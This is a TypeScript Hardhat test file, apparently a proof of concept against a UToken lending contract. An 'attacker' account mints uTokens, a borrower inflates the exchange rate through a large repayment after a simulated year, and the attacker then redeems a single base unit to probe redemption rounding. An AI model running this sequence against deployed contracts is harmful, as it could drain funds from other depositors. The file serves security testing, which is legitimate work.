import {ethers} from "hardhat";
import {Signer} from "ethers";
import deploy, {Contracts} from "../../deploy";
import {formatEther, parseUnits} from "ethers/lib/utils";
import {getConfig} from "../../deploy/config";
import {getDai, warp} from "../../test/utils";

describe("UToken redeeming", () => {
    let attacker: Signer;
    let attackerAddress: string;

    let borrower: Signer;
    let borrowerAddress: string;

    let deployer: Signer;
    let deployerAddress: string;

    let contracts: Contracts;

    before(async function () {
        const signers = await ethers.getSigners();
        deployer = signers[0];
        deployerAddress = await deployer.getAddress();
        contracts = await deploy({...getConfig(), admin: deployerAddress}, deployer);

        attacker = signers[1];
        attackerAddress = await attacker.getAddress();

        borrower = signers[2];
        borrowerAddress = await borrower.getAddress();

        await contracts.uToken.setMintFeeRate(0);

        // set the borrow rate to be 100%
        await contracts.fixedInterestRateModel.setInterestRate(317097919830);

        // interests repaid all goes to the utoken minters
        await contracts.uToken.setReserveFactor(0);
    });

    it("set up credit line", async () => {
        const AMOUNT = parseUnits("10000");

        await contracts.userManager.addMember(borrowerAddress);
        await contracts.userManager.addMember(deployerAddress);

        // mint dai
        await getDai(contracts.dai, deployer, AMOUNT);
        await contracts.dai.approve(contracts.uToken.address, AMOUNT);
        await contracts.uToken.mint(AMOUNT);

        // stake
        await getDai(contracts.dai, deployer, AMOUNT);
        await contracts.dai.approve(contracts.userManager.address, AMOUNT);
        await contracts.userManager.stake(AMOUNT);

        // vouche for the borrower
        await contracts.userManager.updateTrust(borrowerAddress, AMOUNT);
        await contracts.userManager.getCreditLimit(borrowerAddress);
    });

    it("mint", async () => {
        const mintAmount = parseUnits("1");
        await getDai(contracts.dai, attacker, mintAmount);
        await contracts.dai.connect(attacker).approve(contracts.uToken.address, mintAmount);
        await contracts.uToken.connect(attacker).mint(mintAmount);
        const initUTokenBal = await contracts.uToken.balanceOf(attackerAddress);
        console.log({initUTokenBal: formatEther(initUTokenBal)});
        const daiValue = await contracts.uToken.balanceOfUnderlying(attackerAddress);
        console.log({daiValue: formatEther(daiValue)});
        const rate = await contracts.uToken.exchangeRateStored();
        console.log({exchangeRate: formatEther(rate)});
    });

    it("pump up the exchange rate", async () => {
        const borrowAmount = parseUnits("1000");
        await contracts.uToken.connect(borrower).borrow(borrowerAddress, borrowAmount);

        // advance time by 1 year
        await warp(3600 * 24 * 365);

        // repay enough to make the exchange rate go up
        const repayAmount = parseUnits("10000");
        await getDai(contracts.dai, borrower, repayAmount);
        await contracts.dai.connect(borrower).approve(contracts.uToken.address, repayAmount);
        await contracts.uToken.connect(borrower).repayBorrow(borrowerAddress, repayAmount);
    });

    it("redeem", async () => {
        const redeemAmount = "1";
        await contracts.uToken.connect(attacker).redeem(0, redeemAmount);
        const remainingUTokenBal = await contracts.uToken.balanceOf(attackerAddress);
        console.log({remainingUTokenBal: formatEther(remainingUTokenBal)});
        const daiValue = await contracts.uToken.balanceOfUnderlying(attackerAddress);
        console.log({daiValue: formatEther(daiValue)});
        const rate = await contracts.uToken.exchangeRateStored();
        console.log({exchangeRate: formatEther(rate)});
    });
});
